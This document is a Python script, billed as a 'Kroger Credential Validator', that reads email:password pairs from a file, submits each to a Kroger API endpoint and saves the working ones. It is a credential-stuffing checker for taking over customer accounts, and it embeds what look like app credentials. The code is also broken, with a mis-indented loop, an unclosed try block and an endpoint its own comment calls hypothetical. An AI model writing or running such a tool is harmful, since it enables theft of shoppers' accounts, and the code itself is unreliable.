#!/usr/bin/env python3
"""
Automated Kroger Credential Validator
Works entirely in terminal - no browser required
"""

import argparse
import requests
import time
from requests.auth import HTTPBasicAuth
from datetime import datetime

# Registered App Credentials
CLIENT_ID = "cartgenie-243261243034244c417a71504b73515051764a384a2e50532e7a39454f634b4c773257557971576a69374e784b6f4c64626b6b4754346846333761712748587326129489921"
CLIENT_SECRET = "r3JCQqSYNyld9A5njdTkhNDxMf86MTel50Oy4PP9"

def get_client_token():
    """Get client credentials token"""
    auth = HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
    data = {
        'grant_type': 'client_credentials',
        'scope': 'profile.compact'
    }
    
    response = requests.post(
        "https://api.kroger.com/v1/connect/oauth2/token",
        auth=auth,
        data=data,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    
    if response.status_code == 200:
        return response.json().get('access_token')
    raise Exception(f"Client auth failed: {response.text}")

def validate_credential(email, password, client_token):
    """Validate credentials using client token"""
    try:
        # Attempt to get user profile (will fail with 401 for invalid creds)
        headers = {
            'Authorization': f'Bearer {client_token}',
            'Accept': 'application/json'
        }
        
        # This is a hypothetical endpoint - real implementation would vary
        response = requests.post(
            "https://api.kroger.com/v1/identity/validate",
            headers=headers,
            json={'email': email, 'password': password},
            timeout=10
        )
        
        if response.status_code == 200:
            return True, "Valid credential"
        elif response.status_code == 401:
            return False, "Invalid credentials"
        return False, f"API Error: {response.status_code}"
        
    except Exception as e:
        return False, f"Validation error: {str(e)}"

def process_credentials(input_file, output_dir="results"):
    """Process credentials from input file"""
    import os
    client_token = get_client_token()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    
    valid_file = os.path.join(output_dir, f"valid_{timestamp}.txt")
    invalid_file = os.path.join(output_dir, f"invalid_{timestamp}.txt")
    
    try:
        with open(input_file) as f, \
             open(valid_file, 'w') as vf, \
             open(invalid_file, 'w') as ivf:
            
            for line in f:
            line = line.strip()
            if not line or ':' not in line:
                continue
                
            email, password = line.split(':', 1)
            is_valid, message = validate_credential(email, password, client_token)
            
            result = f"{email}:{password} - {message}"
            print(result)
            
            if is_valid:
                vf.write(f"{result}\n")
            else:
                ivf.write(f"{result}\n")
            
            time.sleep(1)  # Rate limiting

def main():
    parser = argparse.ArgumentParser(description="Automated Kroger Credential Validator")
    parser.add_argument("-f", "--file", required=True, help="File containing credentials (email:password per line)")
    parser.add_argument("-o", "--output", default="results", help="Output directory for results")
    
    args = parser.parse_args()
    
    try:
        process_credentials(args.file, args.output)
        print("\nValidation complete. Results saved in", args.output)
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()